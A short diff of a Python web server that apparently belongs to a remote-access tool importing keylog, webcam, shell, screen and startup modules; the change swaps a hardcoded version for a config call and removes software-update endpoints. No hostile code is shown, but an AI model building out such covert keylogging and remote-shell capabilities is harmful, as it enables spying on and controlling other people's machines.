@@ -21,7 +21,7 @@ import updater
 from features import screen, webcam, shell, files, system, audio, keylog, startup
 
 PORT = 5000
-VERSION = "1.0.0"
+VERSION = config.get_version()
 
 # ── Embedded HTML page ──────────────────────────────────────────────
 
@@ -326,20 +326,6 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/api/keylog/clear":
             keylog.clear()
             self._json({"ok": True})
-            return
-
-        if path == "/api/update/check":
-            info = updater.check_update()
-            self._json({"ok": True, "update": info})
-            return
-
-        if path == "/api/update/apply":
-            info = updater.check_update()
-            if info:
-                updater.apply_update(info)
-                self._json({"ok": True, "version": info["version"]})
-            else:
-                self._json({"ok": False, "error": "No update available"})
             return
 
         self._json({"ok": False, "error": "Not found"}, 404)
